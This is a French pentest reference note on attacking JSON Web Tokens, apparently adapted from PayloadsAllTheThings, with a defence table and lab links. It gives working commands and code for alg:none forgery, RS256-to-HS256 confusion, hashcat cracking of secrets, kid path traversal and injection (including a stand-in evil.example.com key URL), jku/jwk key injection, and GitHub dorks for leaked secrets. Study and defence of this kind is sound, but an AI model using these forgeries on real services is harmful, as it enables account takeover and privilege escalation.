---
title: "Attaques JWT"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# 🔏 Attaques JWT

> [!info] **En 1 phrase**
> JWT = jeton d'authentification **signé** (`header.payload.signature`). Attaques = forger un token
> pour **devenir admin / un autre utilisateur** en abusant de l'algorithme (`none`, confusion HS/RS),
> de la clé (faible, publique, injectable via `kid`/`jku`/`jwk`) ou des claims.
>
> Source principale : **[PayloadsAllTheThings (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md)**

---

## 🎯 Concept

```mermaid
sequenceDiagram
    participant Att as Attaquant
    participant App as Application
    participant Srv as Serveur de validation

    Att->>App: Token légitime header.payload.signature
    App->>Srv: Vérifie signature (clé secrète)
    Srv-->>App: OK

    Att->>App: header {"alg":"none"} + payload admin (signature vide)
    App->>Srv: Vérification
    Srv-->>App: ⚠️ ACCEPTÉ si alg none autorisé (CVE-2015-9235)

    Att->>App: HS256 signé avec la CLÉ PUBLIQUE du serveur
    App->>Srv: Vérification HMAC
    Srv-->>App: ⚠️ ACCEPTÉ si confusion RS256→HS256 (CVE-2016-5431)

    Att->>App: kid="/dev/null" ou jku=http://attacker/jwks.json
    App->>Srv: Récupère la clé pointée par kid/jku
    Srv-->>App: ⚠️ ACCEPTÉ (clé contrôlée par l'attaquant)
```

> [!info] 💡 **Rappel structure**
> `Base64URL(Header) . Base64URL(Payload) . Base64URL(Signature)` — 3 segments séparés par des points.
> Le **header** indique l'algorithme (`alg`) et l'identifiant de clé (`kid`) ; le **payload** porte les claims
> (user, `role`, `exp`, `admin`...) ; la **signature** prouve que le token n'a pas été modifié.

---

## 🧬 Format & Claims

### Format du token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header  → {"alg":"HS256","typ":"JWT"}
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload → {"sub":"1234567890","name":"Amazing Haxx0r","exp":"1466270722","admin":true}
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature HMAC/privée
```

### Header — paramètres enregistrés (RFC 7515 JWS)

| Paramètre | Rôle |
|---|---|
| `alg` | Algorithme de signature (`HS256`, `RS256`, `none`...) |
| `jku` | URL du **JWKS** (jeu de clés publiques) à aller chercher |
| `jwk` | **Clé publique embarquée directement** dans le header |
| `kid` | Identifiant de la clé utilisée pour signer |
| `x5u` | URL du certificat X.509 |
| `x5c` | Chaîne de certificats X.509 (PEM) |
| `x5t` / `x5t#S256` | Empreintes SHA-1 / SHA-256 du certificat |
| `typ` | Type de média, généralement `JWT` |
| `cty` / `crit` | Content type / paramètres critiques (déconseillés) |

### Algorithme `alg`

| Valeur | Algorithme | Type |
|---|---|---|
| `HS256` / `HS384` / `HS512` | HMAC-SHA (clé **symétrique**) | défaut, requis |
| `RS256` / `RS384` / `RS512` | RSA PKCS#1 v1.5 (clé **asymétrique**) | recommandé |
| `ES256` / `ES384` / `ES512` | ECDSA P-256/P-384/P-521 | recommandé |
| `PS256` / `PS384` / `PS512` | RSA-PSS | optionnel |
| `none` | Aucune signature | ⚠️ critique |

### Claims du payload (RFC 7519)

- `iss` : émetteur du token
- `exp` : timestamp d'expiration (en secondes) — token expiré = rejeté
- `iat` : date d'émission, permet de connaître l'âge du token
- `nbf` : "not before" — date à partir de laquelle le token est actif
- `jti` : identifiant unique, sert à empêcher le **replay**
- `sub` : sujet du token (l'utilisateur) — rarement vérifié !
- `aud` : audience du token — rarement vérifié !

---

## 🧰 Outils

| Outil | Usage |
|---|---|
| [jwt_tool (ticarpi)](https://github.com/ticarpi/jwt_tool) | Test, tampering, crack, fuzzing de tokens (Python) |
| [c-jwt-cracker (brendan-rius)](https://github.com/brendan-rius/c-jwt-cracker) | Brute force du secret en C |
| [jwt-cracker](https://github.com/lmammino/jwt-cracker) | Brute force JS (Node) |
| [JOSEPH (PortSwigger)](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) | Helper Burp pour JOSE (JWS + JWE) |
| [JWT Editor (PortSwigger)](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) | Signer/éditer les tokens depuis Burp |
| [jwt.io](https://jwt.io/) | Décoder / encoder en ligne |
| hashcat / john | Cracker le secret HMAC |

### Décoder / forger un token

```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Décoder sans vérifier la signature
jwt.decode(token, options={"verify_signature": False})

# Forger un token avec un secret connu
jwt.encode({"sub": "1234567890", "name": "John Doe"}, "secret", algorithm="HS256")

# Vérifier (l'échec de signature → erreur)
jwt.decode(token, "secret", algorithms=["HS256"])
```

```bash
# jwt_tool : décode (sans -T), ou affiche header+payload (-T)
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T
# Injecter / modifier des claims
python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2   # header
python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3                           # payload
```

---

## 🚫 Attaque "alg: none" (CVE-2015-9235)

L'algorithme `none` existe pour le **debug**. Si le serveur accepte un token sans signature, on modifie
le header et on **supprime la signature** → token admin instantané.

> [!warning] ⚠️ Condition : il faut **obligatoirement retirer la signature** (3e segment vide),
> sinon l'attaque échoue. Attention aussi à l'expiration (`exp`) du token original.

Variantes de casse acceptées : `none`, `None`, `NONE`, `nOnE`.

```bash
# jwt_tool (mode "alg none")
python3 jwt_tool.py [JWT_HERE] -X a
```

```txt
# Token forgé : header {"alg":"none","typ":"JWT"} + payload admin + signature VIDE
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
decodedToken = jwt.decode(jwtToken, verify=False)

# ré-encoder en 'none' (algorithme None, clé vide)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
print(noneEncoded.decode())
```

> [!info] 💡 **Quand ça marche** : implémentations qui laissent le champ `alg` contrôlable par le client,
> whitelist d'algorithmes absente ou contenant `none`, libs mal configurées (par ex. `verify=True` sans
> `algorithms=[...]` explicite). Vérifie aussi les variantes `"alg":"None"` avec majuscules.

---

## 🔀 Confusion d'algorithme RS256 → HS256 (CVE-2016-5431)

Le serveur attend un token **RS256** (RSA asymétrique) mais le bibliothèque choisit l'algorithme depuis
le **header du token**. Si on envoie `"alg":"HS256"`, il valide avec la **clé publique RSA** comme secret
HMAC symétrique. Or la clé publique est **souvent accessible** → on peut signer notre propre token.

> L'algo **HS256** signe et vérifie avec **la même clé** (symétrique).
> L'algo **RS256** signe avec la **clé privée** et vérifie avec la **clé publique**.

### Récupérer la clé publique

```bash
# Si l'app utilise la même paire RSA que le serveur TLS :
openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout
```

### Exploitation Python

```python
import jwt
public = open('public.pem', 'r').read()
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

> [!warning] ⚠️ Ce comportement est corrigé dans pyjwt (erreur `InvalidKeyError: The specified key is
> an asymmetric key or x509 certificate...`). Il faut une version vulnérable :
> `pip install pyjwt==0.4.3`.

### jwt_tool

```bash
python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
```

### Signature manuelle (openssl)

```bash
# 1. Convertir la clé publique PEM en hex
cat key.pem | xxd -p | tr -d "\n"
# → 2d2d2d2d2d424547494e20505...592d2d2d2d2d0a

# 2. Signer le header.payload édité (alg passé à HS256) en HMAC avec la clé en hex
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505...592d2d2d2d2d0a
# (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0

# 3. Convertir la signature hex → base64url
python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
# → j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA

# 4. Assembler : [HEADER HS256].[PAYLOAD].[SIGNATURE base64url]
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
```

### Via Burp JWT Editor

1. Trouver la clé publique (souvent `/jwks.json` ou `/.well-known/jwks.json`).
2. Onglet **Keys** → `New RSA Key` → coller le JWK : `{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`.
3. `PEM` → copier le PEM → onglet **Decoder** → Base64-encoder.
4. `New Symmetric Key` (JWK) → remplacer le paramètre `k` par le PEM encodé.
5. Éditer le token : `alg` → `HS256` + modifier le payload → **Sign** (`Don't modify header`).

---

## 🔓 Clé faible / brute force du secret

Le secret HMAC est parfois court/dictionnaire (`secret`, `your_jwt_secret`, `change_this_super_secret_random_string`...).
Une fois le secret trouvé, on signe n'importe quel payload.

> [!tip] 💡 Liste de **3502 secrets publics** à tester en priorité :
> [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

### Hashcat (mode 16500 = JWT HS256)

```bash
# Attaque par dictionnaire
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
# Avec règles (ajoute leetspeak, suffixes...)
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
# Brute force (8 lettres, incrémentiel à partir de 6)
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

### John

```bash
john jwt.txt --wordlist=wordlist.txt
john --show jwt.txt          # secrets trouvés
```

### jwt_tool

```bash
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
```

Puis **éditer les claims** et **resigner** avec le secret trouvé :

```txt
Current value of role is: user
Please enter new value and hit ENTER
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] Continue to next step
Please select a field number (or 0 to Continue):
> 0
Token Signing:
[1] Sign token with known key
...
Please enter the known key:
> secret
Please enter the key length:
[1] HMAC-SHA256
> 1
# → Nouveau token forgé (URL safe + standard)
```

### c-jwt-cracker / jwt-cracker

```bash
# brendan-rius/c-jwt-cracker (C) : compile puis
./jwtcrack <TOKEN>
# lmammino/jwt-cracker (Node)
jwt-cracker <TOKEN> --max-length 8
```

---

## 🗝️ Injection `kid` / `jku` / `jwk` — Key Injection

Le claim `kid` (header) dit au serveur **quelle clé aller chercher** pour vérifier la signature.
Si on contrôle `kid`, on contrôle la clé → on signe notre token.

### `kid` → fichier local (path traversal / prédictible)

Le contenu du fichier pointé sert de **secret HMAC**. Si son contenu est vide ou prédictible, on signe avec.

```json
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/root/res/keys/secret.key"
}
```

```bash
# kid → /dev/null (fichier vide = secret vide "")
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# kid → fichier au contenu PRÉDICTIBLE ("2" dans le fichier)
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

```py
# Forcer une clé distante contrôlée via kid
jwt.encode(
    {"some": "payload"},
    "secret",
    algorithm="HS256",
    headers={"kid": "http://evil.example.com/custom.key"},
)
```

### `kid` → SQLi / Command Injection

Le `kid` peut être concaténé dans une requête SQL ou une commande. Fuzzer avec jwt_tool :

```bash
python3 jwt_tool.py JWT_HERE -I -hc kid -hv custom_sqli_vectors.txt
```

### `jku` → JWKS contrôlé (jku header injection)

`jku` pointe vers l'URL du **JWKS** (jeu de clés publiques). On remplace l'URL par **notre** JWKS
(hébergé) et on signe le token avec la clé privée correspondante.

Endpoints publics à regarder : `/jwks.json`, `/.well-known/jwks.json`, `/openid/connect/jwks.json`,
`/api/keys`, `/api/v1/keys`, `/{tenant}/oauth2/v1/certs`.

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
}
```

```bash
# jwt_tool : génère une paire de clés + signe, à pointer vers son JWKS
python3 jwt_tool.py JWT_HERE -X s
python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
```

### `jwk` → clé embarquée (CVE-2018-0114)

Le standard JWS autorise l'**intégration d'une clé publique JWK dans le header** (`jwk`). Le serveur
(Cisco node-jose < 0.11.0) fait confiance à cette clé pour vérifier la signature → on retire la
signature, on embarque **notre clé publique** et on signe avec la clé privée correspondante.

```bash
python3 jwt_tool.py JWT_HERE -X i
```

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.[payload].[signed with the new private key]
```

---

## ⚔️ Autres attaques

### Signature nulle (CVE-2020-28042)

Envoi d'un JWT HS256 **sans signature** (3e segment vide) — certains serveurs l'acceptent.

```bash
python3 jwt_tool.py JWT_HERE -X n
```

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

### Divulgation de la bonne signature (CVE-2019-7644)

Envoyer un JWT avec une **mauvaise signature** → le serveur peut répondre avec une erreur qui révèle
la **signature correcte attendue** (Auth0-WCF-Service-JWT, jwt-dotnet).

```txt
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

### Récupérer la clé publique RSA depuis 2 tokens signés

RSA PKCS#1 v1.5 (RS256/384/512) permet de **calculer la clé publique** à partir de 2 messages +
2 signatures. Outil : [SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey).

```bash
docker run -it ttervoort/jws2pubkey JWS1 JWS2
docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
```

### Manipulation des claims

| Claim | Attaque |
|---|---|
| `sub` | Changer `"sub":"user"` → `"sub":"admin"` ou `"id":"1"` → autre uid (si le serveur fait confiance au contenu sans vérifier l'émetteur) |
| `jti` | **Replay** : réutiliser un token valide (`jti` absent = pas de protection anti-replay) |
| `exp` / `nbf` | Remonter `exp` dans le futur / remettre `nbf` dans le passé → token jamais expiré |
| `role` / `admin` / `isAdmin` | Bypass d'autorisation direct si l'app ne vérifie que le payload |
| `alg` mixing | Garder `RS256` et signer un autre header, ou combiner plusieurs alg sur des tokens distincts |

### Vérification absente ou bâclée

- **Aucune vérification de signature** : modifier librement header+payload, garder la même signature
  (elle est ignorée). Test : décoder, changer un claim, renvoyer → si accepté, l'app ne vérifie rien.
- **`verify_signature=False` / `verify=False`** dans le code = signature jamais contrôlée.

### Alg mixing "HS256 avec clé publique"

Variante de la confusion : forcer `"alg":"HS256"` quand le serveur possède la clé publique (par ex.
récupérée par jws2pubkey, `/jwks.json` ou le certificat TLS) → même exploitation que la section
« Confusion RS256 → HS256 ».

---

## 🔐 JWE (JSON Web Encryption) — note

- **JWS** (signé) = l'objet de la majorité des attaques ci-dessus (intégrité + authentification).
- **JWE** (chiffré) = chiffre le contenu ; on ne peut pas lire les claims mais le **header est en clair**
  (visible), donc `alg`/`kid`/`jku`/`jwk` restent testables → les attaques key injection s'appliquent aussi.
- Outil Burp : [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
  (JavaScript Object Signing and Encryption Pentesting Helper) gère JWS **et** JWE.

---

## 🔍 Détection & Défense

| Réponse | Détail |
|---|---|
| **Whitelist `alg`** | N'accepter que les algorithmes prévus, jamais `none`, jamais le choix depuis le header client |
| **Clés fortes** | Secrets HMAC longs/aléatoires (≥ 256 bits), rotation régulière, pas de clé publique comme secret |
| **Vérifier `kid`/`jku`/`x5u`** | Pas de path traversal, pas d'URL externe non contrôlée, `kid` jamais injecté dans SQL/commande |
| **Ne pas faire confiance au payload** | Vérifier `iss`, `aud`, `exp`, `nbf`, `iat`, `sub` côté serveur (audience/issuer validation) |
| **Anti-replay** | Valider `jti`, stocker les tokens utilisés, durée de vie courte |
| **Vérification de signature systématique** | Rejeter les signatures vides/invalides, `algorithms=[...]` explicite dans pyjwt |
| **Gestion des clés** | Ne jamais exposer `/jwks.json` si inutile, restreindre les clés d'émission vs vérification |
| **Surveillance** | Alerter sur : alg inattendu, token sans signature, `kid` path traversal, claims `role` modifiés, vol de token (replay) |

---

## ⚠️ Tips & Pièges

> [!tip] 💡 **Identifier un JWT dans une app**
> Chercher dans les headers `Authorization: Bearer <token>`, cookies, `localStorage`, requêtes.
> Un JWT = 3 segments base64url : `eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
> (le header décode en `{"alg":...,"typ":"JWT"}`). Penser aussi aux tokens dans l'historique Burp.

> [!tip] 💡 **Ordre d'attaque**
> 1. Décoder (`jwt.io`, `jwt_tool -T`) → regarder `alg`, `kid`, `jku`, claims (`role`, `exp`, `sub`).
> 2. Tester `alg=none` puis signature vide/null (instantané, zéro coût).
> 3. Regarder si une **clé publique** est dispo (TLS, `/jwks.json`) → confusion RS256→HS256.
> 4. Tester `kid`/`jku`/`jwk` injection (path traversal, URL, SQLi).
> 5. Cracker le secret (hashcat 16500 / john) si HS256 → resigner les claims.

> [!warning] ⚠️ **Piège confusion RS/HS**
> Beaucoup de serveurs utilisent la **même paire RSA** que leur certificat TLS : `openssl s_client |
> openssl x509 -pubkey -noout` suffit. Mais pyjwt ≥ 0.4.3 **bloque** l'usage d'une clé asymétrique en
> HMAC (`InvalidKeyError`) → utiliser `pyjwt==0.4.3`, jwt_tool, ou la méthode openssl manuelle.

> [!warning] ⚠️ **Le `kid` est injectable** (path traversal, URL distante, SQLi)
> Toujours tester `../../dev/null` (secret vide), `/proc/sys/kernel/randomize_va_space` (secret `"2"`),
> une URL contrôlée, et des vecteurs SQL (`kid` passé dans une requête SQL). Un `kid` "propre" ne protège
> pas forcément : vérifie aussi `jku` (JWKS distants) et `jwk` (clé embarquée).

> [!warning] ⚠️ **Recherche de secret par git dorking**
> Les secrets HMAC finissent souvent dans les repos publics. Dorks GitHub :
> `"jwt_secret"`, `"JWT_SECRET"`, `"secret_key" extension:env`, `"your-256-bit-secret"`,
> `"super_secret_key"`, `jwt secret site:gist.github.com`, `filename:jwt`... Outils : trufflehog,
> gitleaks, gitrob. Même chose côté fichiers de config exposés (`config.js`, `.env`, `docker-compose.yml`).

> [!warning] ⚠️ **Stockage du token = vecteur XSS**
> JWT en `localStorage` (pas `HttpOnly`) = exfiltration via XSS. JWT dans un cookie = attention CSRF.
> Voir [[XSS (Cross-Site Scripting)|🖼️ XSS]].

> [!tip] 💡 **Replay & expiration**
> Un token avec `jti` absent et `exp` lointain est rejouable. Tester le replay (même token 2×), et
> modifier `exp` dans le futur + remettre `nbf` dans le passé quand les claims ne sont pas vérifiés.

---

## 🧪 Labs

- PortSwigger — JWT : authentication bypass via **unverified signature**, **flawed signature verification**,
  **weak signing key**, **jwk header injection**, **jku header injection**, **kid header path traversal** :
  https://portswigger.net/web-security/all-labs#json-web-tokens
- Root-Me : JWT Introduction, Revoked token, Weak secret, Unsecure File Signature, Public key,
  Header Injection, Unsecure Key Handling : https://www.root-me.org/

---

## 🔗 Liens

- [[Injection SQL|💾 SQLi]] (SQLi dans le claim `kid`)
- [[XSS (Cross-Site Scripting)|🖼️ XSS]] (vol de token)
- [[SSRF|🌐 SSRF]] (`jku`/`x5u` → fetch de URL contrôlées)
- [[LFI et RFI|📂 LFI / RFI]] (path traversal dans `kid`)
- [[OAuth|🔑 OAuth]] (JWKS, OpenID Connect, `iss`/`aud`)
- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
- 📚 Source : [PayloadsAllTheThings — JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md)
